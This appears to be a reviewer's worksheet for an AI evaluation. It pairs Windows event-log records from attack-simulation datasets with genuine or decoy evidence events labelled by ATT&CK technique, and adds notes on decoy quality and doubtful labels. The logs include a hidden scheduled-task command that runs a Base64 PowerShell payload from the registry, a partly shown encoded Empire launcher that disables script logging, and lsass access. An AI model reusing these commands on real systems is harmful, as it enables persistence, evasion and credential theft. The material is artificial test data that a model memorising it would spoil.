- original Event ID 4104, channel `Microsoft-Windows-PowerShell/Operational`; evidence Event ID 1, channel `Microsoft-Windows-Sysmon/Operational`; same channel: False
- decoy technique: **T1059.003**; evidence from cluster `T1059.003|cmd_dumping_ntds_dit_file_ntdsutil.json|2023-07-19 16:02` (event `ae4b62e1857e1a39`)
- fields removed or masked: Hostname, TimeCreated, UtcTime, ProcessGuid, ProcessId (masked), LogonGuid, ParentProcessGuid, ParentProcessId (masked)
- technique names in evidence text: none; automatic leak check: clean

**Original event**

```text
EventTime: 2020-05-01 23:00:48
EventID: 4104
SourceName: Microsoft-Windows-PowerShell
AccountType: User
ScriptBlockText: cd "C:\Program Files\SysinternalsSuite\"
Domain: DMEVALS
ActivityID: {BCCD0404-4290-0001-6BE3-12D71F20D601}
Category: Execute a Remote Command
MessageNumber: 1
Channel: Microsoft-Windows-PowerShell/Operational
AccountName: pbeesly
MessageTotal: 1
UserID: S-1-5-21-1830255721-3727074217-2423397540-1107
ScriptBlockId: ecdb003d-8e22-4d61-8534-e65d6ddb3c01
Hostname: SCRANTON.dmevals.local
```

**Evidence (as the model sees it)**

```text
SourceName: Microsoft-Windows-Sysmon
Channel: Microsoft-Windows-Sysmon/Operational
EventID: 1
RuleName: -
ProcessId: [PID]
Image: C:\Windows\System32\conhost.exe
FileVersion: 10.0.20348.1547 (WinBuild.160101.0800)
Description: Console Window Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CONHOST.EXE
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: PANDALAB\Administrator
LogonId: 0x627b7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=60E8EAC42CF08EE636DF61571BB06211B7FE534D,MD5=583949DAE7928EB33D7886EABA403BC9,SHA256=BD9E848DFF441D60D72B7F17A12448D1A886C4A34CA7A641F527BE3007293CDD,IMPHASH=E6E74C33F84DABF4FD1EAFDE89D16B87
ParentProcessId: [PID]
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe" 
ParentUser: PANDALAB\Administrator
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is a plausible event of the decoy technique
- [ ] nothing outside the event itself gives the condition away
- notes: Weak. The evidence is conhost.exe started automatically by an interactive cmd.exe (the fixed arguments 0xffffffff -ForceV1). It shows only that a cmd window was opened, with no command, so it is a weak decoy for command shell use. It also comes from another environment (domain PANDALAB, a Windows Server 2022 build) while the original is from DMEVALS. All 53 T1059.001 misleading pairs draw on only 2 T1059.003 events, so this weakness cannot be fixed and goes into the limitations.


---

## 12. T1059.003, genuine

- pair: `30f8bc022db8378b|genuine`  (cluster `T1059.003|apt29_evals_day1_manual_2020-05-01225525.json|2020-05-02 03:03`)
- baseline correct on this event: True
- original Event ID 1, channel `Microsoft-Windows-Sysmon/Operational`; evidence Event ID 4688, channel `Security`; same channel: False
- link: **pid**, |dt| = 0.0 s; raw file `apt29_evals_day1_manual_2020-05-01225525.json`, index 50055
- fields removed or masked: EventTime, SubjectUserName (masked), NewProcessId (masked), ProcessId (masked), Hostname
- technique names in evidence text: none; automatic leak check: clean

**Original event**

```text
ParentProcessGuid: {32aa854b-e30d-5eac-5b03-000000000300}
Product: Microsoft® Windows® Operating System
Description: Console Window Host
ParentCommandLine: "cmd"
Domain: NT AUTHORITY
LogonId: 0x3e7
UtcTime: 2020-05-02 03:03:41.438
IntegrityLevel: System
TerminalSessionId: 0
AccountName: SYSTEM
ProcessGuid: {32aa854b-e30d-5eac-5c03-000000000300}
FileVersion: 10.0.17763.1075 (WinBuild.160101.0800)
UserID: S-1-5-18
Hostname: NEWYORK.dmevals.local
RuleName: -
EventID: 1
SourceName: Microsoft-Windows-Sysmon
AccountType: User
CommandLine: \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\windows
LogonGuid: {32aa854b-c64c-5eac-e703-000000000000}
ParentProcessId: 1572
Channel: Microsoft-Windows-Sysmon/Operational
ParentImage: C:\Windows\System32\cmd.exe
Image: C:\Windows\System32\conhost.exe
Company: Microsoft Corporation
ProcessId: 1688
User: NT AUTHORITY\SYSTEM
OriginalFileName: CONHOST.EXE
Hashes: SHA1=74F28DD9B0DA310D85F1931DB2749A26A9A8AB02,MD5=AD99B6147CBFF1C8ECCE8CE44E742681,SHA256=912D217D9F34121BC6150A2D7F22B49D2C876942653348C671F358FF58AF0EBA,IMPHASH=76923AA1BF85799F169FC2A8BB03894A
EventTime: 2020-05-01 23:03:41
```

**Evidence (as the model sees it)**

```text
EventID: 4688
TargetLogonId: 0x0
SourceName: Microsoft-Windows-Security-Auditing
SubjectLogonId: 0x3e7
NewProcessName: C:\Windows\System32\cmd.exe
TargetDomainName: -
MandatoryLabel: S-1-16-16384
TargetUserSid: S-1-0-0
ParentProcessName: C:\WindowsAzure\Packages\CollectGuestLogs.exe
CommandLine: "cmd"
Category: Process Creation
TokenElevationType: %%1936
TargetUserName: -
SubjectUserSid: S-1-5-18
Channel: Security
SubjectUserName: [HOST]$
NewProcessId: [PID]
SubjectDomainName: DMEVALS
ProcessId: [PID]
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is really related to the original (same process / same activity)
- [ ] nothing outside the event itself gives the condition away
- notes: OK (label in doubt). Good evidence. It is the creation of the parent cmd.exe (PID link, 0 s), and it shows that cmd.exe was started by the Azure guest agent’s log collector (C:\WindowsAzure\Packages\CollectGuestLogs.exe). The original event is therefore probably routine cloud agent activity rather than attacker command shell use, so its T1059.003 label may be a false positive of the rule, like the dsregcmd.exe case. If the model changes its answer to NONE with this evidence, it would count as a regression against the rule label although it may be right.


---

## 13. T1059.003, misleading

- pair: `ae4b62e1857e1a39|misleading`  (cluster `T1059.003|cmd_dumping_ntds_dit_file_ntdsutil.json|2023-07-19 16:02`)
- baseline correct on this event: True
- original Event ID 1, channel `Microsoft-Windows-Sysmon/Operational`; evidence Event ID 4104, channel `Microsoft-Windows-PowerShell/Operational`; same channel: False
- decoy technique: **T1059.001**; evidence from cluster `T1059.001|apt29_evals_day1_manual_2020-05-01225525.json|2020-05-01 23:07` (event `8833bcafff87ef1d`)
- fields removed or masked: EventTime, ActivityID (masked), ScriptBlockId (masked), Hostname
- technique names in evidence text: PowerShell; automatic leak check: clean

**Original event**

```text
SourceName: Microsoft-Windows-Sysmon
Channel: Microsoft-Windows-Sysmon/Operational
Hostname: DC01.pandalab.com
TimeCreated: 2023-07-19T09:02:24.155Z
EventID: 1
RuleName: -
UtcTime: 2023-07-19 16:02:24.116
ProcessGuid: {fe86be69-0910-64b8-0a03-000000001000}
ProcessId: 4760
Image: C:\Windows\System32\conhost.exe
FileVersion: 10.0.20348.1547 (WinBuild.160101.0800)
Description: Console Window Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CONHOST.EXE
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: PANDALAB\Administrator
LogonGuid: {fe86be69-fbf6-64b5-b727-060000000000}
LogonId: 0x627b7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=60E8EAC42CF08EE636DF61571BB06211B7FE534D,MD5=583949DAE7928EB33D7886EABA403BC9,SHA256=BD9E848DFF441D60D72B7F17A12448D1A886C4A34CA7A641F527BE3007293CDD,IMPHASH=E6E74C33F84DABF4FD1EAFDE89D16B87
ParentProcessGuid: {fe86be69-090f-64b8-0903-000000001000}
ParentProcessId: 3824
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe" 
ParentUser: PANDALAB\Administrator
```

**Evidence (as the model sees it)**

```text
EventID: 4104
SourceName: Microsoft-Windows-PowerShell
AccountType: User
ScriptBlockText: View-Job -JobName "Keystrokes"
Domain: DMEVALS
ActivityID: [GUID]
Category: Execute a Remote Command
MessageNumber: 1
Channel: Microsoft-Windows-PowerShell/Operational
AccountName: pbeesly
MessageTotal: 1
UserID: S-1-5-21-1830255721-3727074217-2423397540-1107
ScriptBlockId: [GUID]
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is a plausible event of the decoy technique
- [ ] nothing outside the event itself gives the condition away
- notes:


---

## 14. T1546.003, genuine

- pair: `5d7981caae79be85|genuine`  (cluster `T1546.003|covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers_2020-09-01214330.json|2020-09-02 01:44`)
- baseline correct on this event: True
- original Event ID 21, channel `Microsoft-Windows-Sysmon/Operational`; evidence Event ID 19, channel `Microsoft-Windows-Sysmon/Operational`; same channel: True
- link: **time**, |dt| = 0.0 s; raw file `covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers_2020-09-01214330.json`, index 3303; this evidence event is itself a **T1546.003** pool event
- fields removed or masked: Hostname, EventTime, UtcTime
- technique names in evidence text: none; automatic leak check: clean

**Original event**

```text
Channel: Microsoft-Windows-Sysmon/Operational
Category: WmiEventConsumerToFilter activity detected (rule: WmiEvent)
UserID: S-1-5-18
AccountName: SYSTEM
Hostname: WORKSTATION6.theshire.local
Operation: Deleted
EventTypeOrignal: INFO
EventTime: 2020-09-01 21:44:40
SourceName: Microsoft-Windows-Sysmon
Domain: NT AUTHORITY
AccountType: User
RuleName: -
User: THESHIRE\pgustavo
UtcTime: 2020-09-02 01:44:40.099
Consumer:  "ActiveScriptEventConsumer.Name=\"WSUS_RP5ZB\""
EventID: 21
Filter:  "__EventFilter.Name=\"WSUS_QQTJ7\""
```

**Evidence (as the model sees it)**

```text
Channel: Microsoft-Windows-Sysmon/Operational
Category: WmiEventFilter activity detected (rule: WmiEvent)
UserID: S-1-5-18
AccountName: SYSTEM
Operation: Deleted
Name:  "WSUS_QQTJ7"
EventTypeOrignal: INFO
SourceName: Microsoft-Windows-Sysmon
Domain: NT AUTHORITY
AccountType: User
RuleName: -
User: THESHIRE\pgustavo
EventID: 19
EventNamespace:  "\\root\\cimv2"
Query:  "select * from __InstanceCreationEvent within 5 where TargetInstance Isa 'Win32_LogonSession'"
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is really related to the original (same process / same activity)
- [ ] nothing outside the event itself gives the condition away
- notes: OK. Good evidence. The original is the deletion of a WMI binding and the evidence is the deletion of the filter it bound (same name WSUS_QQTJ7), so it is the same subscription even though the link is by time. It adds the trigger query (a new logon session), which the original does not show, so it is a different part of the same activity rather than a duplicate. Both events are deletions, i.e. cleanup of the subscription, which the rule also labels T1546.003.


---

## 15. T1546.003, misleading

- pair: `96a9b5efbbeb2e5e|misleading`  (cluster `T1546.003|empire_wmi_local_event_subscriptions_elevated_user_2020-09-04164306.json|2020-09-04 20:43`)
- baseline correct on this event: True
- original Event ID 21, channel `Microsoft-Windows-Sysmon/Operational`; evidence Event ID 1, channel `Microsoft-Windows-Sysmon/Operational`; same channel: True
- decoy technique: **T1053.005**; evidence from cluster `T1053.005|empire_schtasks_creation_standard_user_2020-09-21031526.json|2020-09-21 07:15` (event `8a17b491b39e3890`)
- fields removed or masked: ProcessGuid, LogonGuid, EventTime, ParentProcessGuid, ParentProcessId (masked), UtcTime, Hostname
- technique names in evidence text: PowerShell; automatic leak check: clean

**Original event**

```text
EventID: 21
SourceName: Microsoft-Windows-Sysmon
EventTime: 2020-09-04 16:43:27
UserID: S-1-5-18
Domain: NT AUTHORITY
Category: WmiEventConsumerToFilter activity detected (rule: WmiEvent)
User: THESHIRE\pgustavo
Channel: Microsoft-Windows-Sysmon/Operational
Filter:  "__EventFilter.Name=\"Updater\""
AccountType: User
EventTypeOrignal: INFO
AccountName: SYSTEM
RuleName: -
Consumer:  "CommandLineEventConsumer.Name=\"Updater\""
UtcTime: 2020-09-04 20:43:27.644
Hostname: WORKSTATION5.theshire.local
Operation: Created
```

**Evidence (as the model sees it)**

```text
EventID: 1
Channel: Microsoft-Windows-Sysmon/Operational
AccountType: User
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
AccountName: SYSTEM
CommandLine: "C:\windows\system32\schtasks.exe" /Create /F /SC DAILY /ST 09:00 /TN MordorSchtask /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\""
Domain: NT AUTHORITY
User: THESHIRE\pgustavo
Hashes: SHA1=2CA6101525953606730412294C36D415FEE06B18,MD5=003D681048A63B9862C299F30492CFDF,SHA256=D3222E48A036C6C730BB4E67B4C02E83C87860701975F408E5BF708B4B9CDBF4,IMPHASH=E59000FC08C43F1D70C9403E04909313
SourceName: Microsoft-Windows-Sysmon
CurrentDirectory: C:\Users\pgustavo\
Description: Task Scheduler Configuration Tool
Category: Process Create (rule: ProcessCreate)
Company: Microsoft Corporation
FileVersion: 10.0.18362.175 (WinBuild.160101.0800)
IntegrityLevel: Medium
UserID: S-1-5-18
TerminalSessionId: 2
ParentCommandLine: "C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAcwBJAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAFIAcwBJAE8AbgAuAE0AQQBKAE8AUgAgAC0AZwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAFIARQBGAF0ALgBBAHMAcwBlAG0AQgBMAHkALgBHAEUAVABUAFkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBlAHQARgBJAGUAYABMAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANAAzAEQAZQAyACkAewAkADcAMQAyAEQAYgA9ACQANAAzAGQAZQAyAC4ARwBlAFQAVgBBAGwAVQBlACgAJABuAFUAbABMACkAOwBJAEYAKAAkADcAMQAyAGQAYgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADcAMQAyAEQAYgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADEAMgBkAEIAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAGEATAA9AFsAQwBPAGwATABFAEMAVABpAG8ATgBzAC4ARwBFAG4AZQByAGkAQwAuAEQAaQBjAFQASQBvAG4AQQBSAHkAWwBTAHQAUgBJAE4AZwAsAFMAWQBzAHQAZQBNAC4ATwBiAEoAZQBDAHQAXQBdADoAOgBOAEUAdwAoACkAOwAkAFYAYQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAQQBsAC4AQQBkAGQAKAAnAEUAbgB
... [3923 more characters not shown here; the model sees all of them]
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is a plausible event of the decoy technique
- [ ] nothing outside the event itself gives the condition away
- notes: OK. Strong and plausible decoy. A scheduled task created by the Empire launcher that runs hidden PowerShell with a payload read from the registry, from the same environment and user as the original WMI subscription, so nothing suggests it comes from elsewhere. The encoded launcher contains Empire’s standard code that turns off PowerShell script block logging. This is boilerplate in every Empire launch and should not count as a T1562.002 match when Base64 is decoded in the scans.


---

## 16. T1547.001, genuine

- pair: `243e55d798340ba4|genuine`  (cluster `T1547.001|empire_persistence_registry_modification_run_keys_standard_user_2020-09-04030609.json|2020-09-04 07:08`)
- baseline correct on this event: True
- original Event ID 13, channel `Microsoft-Windows-Sysmon/Operational`; evidence Event ID 11, channel `Microsoft-Windows-Sysmon/Operational`; same channel: True
- link: **guid**, |dt| = 0.0 s; raw file `empire_persistence_registry_modification_run_keys_standard_user_2020-09-04030609.json`, index 17745
- fields removed or masked: TargetFilename (masked), Hostname, ProcessId (masked), ProcessGuid, UtcTime, EventTime, CreationUtcTime
- technique names in evidence text: none; automatic leak check: clean

**Original event**

```text
AccountType: User
Domain: NT AUTHORITY
UserID: S-1-5-18
SourceName: Microsoft-Windows-Sysmon
Hostname: WORKSTATION5.theshire.local
AccountName: SYSTEM
EventID: 13
ProcessId: 3200
ProcessGuid: {3ddc5665-e7d0-5f51-4f00-000000000500}
Category: Registry value set (rule: RegistryEvent)
UtcTime: 2020-09-04 07:08:01.140
EventTime: 2020-09-04 03:08:06
Channel: Microsoft-Windows-Sysmon/Operational
Details: "%%ProgramFiles%%\Windows Defender\MSASCuiL.exe"
EventTypeOrignal: INFO
RuleName: -
Image: C:\Program Files\Windows Defender\MsMpEng.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsDefender
```

**Evidence (as the model sees it)**

```text
AccountType: User
Domain: NT AUTHORITY
TargetFilename: C:\ProgramData\Microsoft\Windows Defender\Support\MpWppTracing-[TIME]-00000003-ffffffff.bin
UserID: S-1-5-18
SourceName: Microsoft-Windows-Sysmon
AccountName: SYSTEM
EventID: 11
ProcessId: [PID]
Category: File created (rule: FileCreate)
Channel: Microsoft-Windows-Sysmon/Operational
RuleName: -
Image: C:\Program Files\Windows Defender\MsMpEng.exe
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is really related to the original (same process / same activity)
- [ ] nothing outside the event itself gives the condition away
- notes:


---

## 17. T1547.001, misleading

- pair: `243e55d798340ba4|misleading`  (cluster `T1547.001|empire_persistence_registry_modification_run_keys_standard_user_2020-09-04030609.json|2020-09-04 07:08`)
- baseline correct on this event: True
- original Event ID 13, channel `Microsoft-Windows-Sysmon/Operational`; evidence Event ID 19, channel `Microsoft-Windows-Sysmon/Operational`; same channel: True
- decoy technique: **T1546.003**; evidence from cluster `T1546.003|empire_wmi_local_event_subscriptions_elevated_user_2020-09-04164306.json|2020-09-04 20:43` (event `44e005ac75b5e4d3`)
- fields removed or masked: EventTime, UtcTime, Hostname
- technique names in evidence text: none; automatic leak check: clean

**Original event**

```text
AccountType: User
Domain: NT AUTHORITY
UserID: S-1-5-18
SourceName: Microsoft-Windows-Sysmon
Hostname: WORKSTATION5.theshire.local
AccountName: SYSTEM
EventID: 13
ProcessId: 3200
ProcessGuid: {3ddc5665-e7d0-5f51-4f00-000000000500}
Category: Registry value set (rule: RegistryEvent)
UtcTime: 2020-09-04 07:08:01.140
EventTime: 2020-09-04 03:08:06
Channel: Microsoft-Windows-Sysmon/Operational
Details: "%%ProgramFiles%%\Windows Defender\MSASCuiL.exe"
EventTypeOrignal: INFO
RuleName: -
Image: C:\Program Files\Windows Defender\MsMpEng.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsDefender
```

**Evidence (as the model sees it)**

```text
EventID: 19
EventNamespace:  "root\\CimV2"
SourceName: Microsoft-Windows-Sysmon
UserID: S-1-5-18
Domain: NT AUTHORITY
Category: WmiEventFilter activity detected (rule: WmiEvent)
User: THESHIRE\pgustavo
Channel: Microsoft-Windows-Sysmon/Operational
AccountType: User
Name:  "Updater"
Query:  "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325"
EventTypeOrignal: INFO
AccountName: SYSTEM
RuleName: -
Operation: Created
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is a plausible event of the decoy technique
- [ ] nothing outside the event itself gives the condition away
- notes: OK (label in doubt). Strong and plausible decoy. An Empire WMI filter named Updater that fires a few minutes after boot, from the same environment as the original. The problem is the original event, the same Defender Run key write as pair 16. If its label is a false positive, the correct answer would be NONE, so a change from T1547.001 to T1546.003 under this evidence could not be read as a regression from a correct answer.


---

## 18. T1562.002, genuine

- pair: `8e494319f9c4cb22|genuine`  (cluster `T1562.002|reg_stop_event_logging_controlset001_minint_key.json|2022-08-03 23:18`)
- baseline correct on this event: False
- original Event ID 12, channel `Microsoft-Windows-Sysmon/Operational`; evidence Event ID 3, channel `Microsoft-Windows-Sysmon/Operational`; same channel: True
- link: **guid**, |dt| = 18.248 s; raw file `reg_stop_event_logging_controlset001_minint_key.json`, index 2696
- fields removed or masked: Hostname, TimeCreated, UtcTime, ProcessGuid, ProcessId (masked), User (masked), SourceHostname, DestinationHostname
- technique names in evidence text: none; automatic leak check: clean

**Original event**

```text
SourceName: Microsoft-Windows-Sysmon
Channel: Microsoft-Windows-Sysmon/Operational
Hostname: Pedro01
TimeCreated: 2022-08-03T04:18:57.341Z
EventID: 12
RuleName: -
UtcTime: 2022-08-03 23:18:57.337
ProcessGuid: {625b42a0-024b-62eb-9305-000000000900}
ProcessId: 6020
Image: C:\Users\IT01-Pedro\Downloads\payload.exe
TargetObject: HKLM\System\CurrentControlSet\Control\MiniNt
User: PEDRO01\pedro
```

**Evidence (as the model sees it)**

```text
SourceName: Microsoft-Windows-Sysmon
Channel: Microsoft-Windows-Sysmon/Operational
EventID: 3
RuleName: -
ProcessId: [PID]
Image: C:\Users\IT01-Pedro\Downloads\payload.exe
User: [HOST]\pedro
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.56.43
SourcePort: 49929
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.56.40
DestinationPort: 8443
DestinationPortName: -
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is really related to the original (same process / same activity)
- [ ] nothing outside the event itself gives the condition away
- notes: OK. Related evidence from the same process (GUID link, 18 s). payload.exe from the Downloads folder opens an outbound connection to port 8443, which suggests command and control traffic and shows that the process is malicious. It does not explain what the MiniNt key does, so whether it helps depends on whether the model knows that technique. The baseline was wrong on this event, so this is one of the few pairs where a correction is possible. Source and destination IPs are not masked.


---

## 19. T1562.002, misleading

- pair: `210eb98244a082ba|misleading`  (cluster `T1562.002|cmd_stop_event_logging_controlset001_minint_key.json|2022-08-04 02:31`)
- baseline correct on this event: False
- original Event ID 12, channel `Microsoft-Windows-Sysmon/Operational`; evidence Event ID 8, channel `Microsoft-Windows-Sysmon/Operational`; same channel: True
- decoy technique: **T1055**; evidence from cluster `T1055|purplesharp_pe_injection_createremotethread_2020-10-2303121085.json|2020-10-23 07:12` (event `8e3d9584157cfe02`)
- fields removed or masked: TimeCreated, UtcTime, TargetProcessGuid, SourceProcessId (masked), Hostname, SourceProcessGuid, TargetProcessId (masked), NewThreadId (masked)
- technique names in evidence text: none; automatic leak check: clean

**Original event**

```text
SourceName: Microsoft-Windows-Sysmon
Channel: Microsoft-Windows-Sysmon/Operational
Hostname: Pedro01
TimeCreated: 2022-08-03T07:31:26.797Z
EventID: 12
RuleName: -
UtcTime: 2022-08-04 02:31:26.795
ProcessGuid: {625b42a0-2f7e-62eb-9b05-000000000900}
ProcessId: 7384
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\System\CurrentControlSet\Control\MiniNt
User: PEDRO01\pedro
```

**Evidence (as the model sees it)**

```text
StartFunction: -
SourceImage: C:\Users\wardog\Desktop\PurpleSharp.exe
SourceProcessId: [PID]
Channel: Microsoft-Windows-Sysmon/Operational
RuleName: -
SourceName: Microsoft-Windows-Sysmon
StartModule: -
TargetProcessId: [PID]
StartAddress: 0x0000023FAD900000
NewThreadId: [TID]
EventID: 8
TargetImage: C:\Windows\System32\notepad.exe
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is a plausible event of the decoy technique
- [ ] nothing outside the event itself gives the condition away
- notes: OK (limited use). Typical decoy for process injection. A remote thread into notepad.exe whose start address is outside any module. However, the source is PurpleSharp.exe, a public attack simulation tool, under the user wardog, while the original comes from the Pedro environment, so the evidence visibly comes from elsewhere. The baseline was already wrong on this event, so the pair cannot show a regression and does not enter the primary test.


---

## 20. T1003.006, misleading

- pair: `f75cb76d84f877ff|misleading`  (cluster `T1003.006|apt29_evals_day1_manual_2020-05-01225525.json|2020-05-01 23:16`)
- baseline correct on this event: True
- original Event ID 4662, channel `Security`; evidence Event ID 10, channel `Microsoft-Windows-Sysmon/Operational`; same channel: False
- decoy technique: **T1003.001**; evidence from cluster `T1003.001|apt29_evals_day1_manual_2020-05-01225525.json|2020-05-02 03:05` (event `2abb6855b6f8b93a`)
- fields removed or masked: EventTime, SourceThreadId (masked), TargetProcessId (masked), UtcTime, SourceProcessId (masked), SourceProcessGUID, TargetProcessGUID, ProcessId (masked), Hostname
- technique names in evidence text: PowerShell; automatic leak check: clean

**Original event**

```text
EventTime: 2020-05-01 23:16:15
EventID: 4662
ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9}
AccessMask: 0x100
Properties: %%7688

		{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}

	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


SourceName: Microsoft-Windows-Security-Auditing
SubjectLogonId: 0x167eda
ObjectServer: DS
HandleId: 0x0
Category: Directory Service Access
AdditionalInfo: -
OperationType: Object Access
SubjectUserSid: S-1-5-18
Channel: Security
SubjectUserName: NEWYORK$
ObjectName: %{11487126-e2dc-4f51-acb1-1b0df0573bb5}
SubjectDomainName: DMEVALS
Hostname: NEWYORK.dmevals.local
AccessList: %%7688

				
```

**Evidence (as the model sees it)**

```text
SourceThreadId: [TID]
EventID: 10
TargetProcessId: [PID]
SourceImage: C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe
SourceName: Microsoft-Windows-Sysmon
AccountType: User
TargetImage: C:\windows\system32\lsass.exe
CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c584|C:\windows\System32\KERNELBASE.dll+2732e|UNKNOWN(000001996D28200D)
Domain: NT AUTHORITY
SourceProcessId: [PID]
Channel: Microsoft-Windows-Sysmon/Operational
AccountName: SYSTEM
GrantedAccess: 0x1fffff
UserID: S-1-5-18
ProcessId: [PID]
RuleName: -
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is a plausible event of the decoy technique
- [ ] nothing outside the event itself gives the condition away
- notes: OK (label in doubt). Strong decoy from the same APT29 environment. PowerShell opens lsass with full access and the call trace ends in unbacked memory, typical of in-memory credential dumping. The original is the same machine account replication event as pair 3, so its T1003.006 label may be a false positive.

